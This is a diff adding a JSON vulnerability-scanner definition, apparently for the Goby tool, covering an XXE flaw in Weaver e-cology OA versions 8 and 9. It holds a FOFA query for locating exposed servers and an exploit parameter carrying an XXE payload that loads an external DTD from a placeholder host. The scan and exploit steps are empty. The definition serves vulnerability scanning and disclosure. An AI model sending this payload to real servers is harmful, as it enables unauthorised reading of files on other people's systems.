@@ -1,0 +1,41 @@
+{
+  "Name": "Weaver e-cology OA XXE",
+  "Description": "Weaver (e-cology) is a set of enterprise information portals, knowledge management, data center, workflow management, human resource management, customer and partner management, project management, financial management, A collaborative business platform for asset management functions. The e-cology v8 and v9(When the security policy is turned on, v9 needs to log in to test) has xxe vulnerabilities.",
+  "Product": "上海泛微网络科技股份有限公司 e-cology",
+  "Homepage": "http://www.weaver.com.cn/",
+  "DisclosureDate": "2020-12-15",
+  "Author": "mahui@gobies.org",
+  "FofaQuery": "app=\"泛微-协同办公OA\" || app=\"Weaver-OA\"",
+  "Level": "2",
+  "Impact": "攻击者可利用漏洞读取文件。",
+  "Recommendation": "目前厂商尚未发布该漏洞补丁，可多关注该产品官网关于此漏洞的信息：<a href=\"https://www.weaver.com.cn/cs/securityDownload.asp\">https://www.weaver.com.cn/cs/securityDownload.asp</a>",
+  "References": [
+    "https://fofa.so"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+		{
+			"name": "xxe_local",
+			"type": "input",
+			"show": "",
+			"value": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM \"http://ip/*.dtd\">%aaa;%ccc;%ddd;]>"
+		}
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [],
+  "ExploitSteps": [],
+  "Tags": ["XXE"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["Weaver-OA"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  },
+"Disable": false
+}
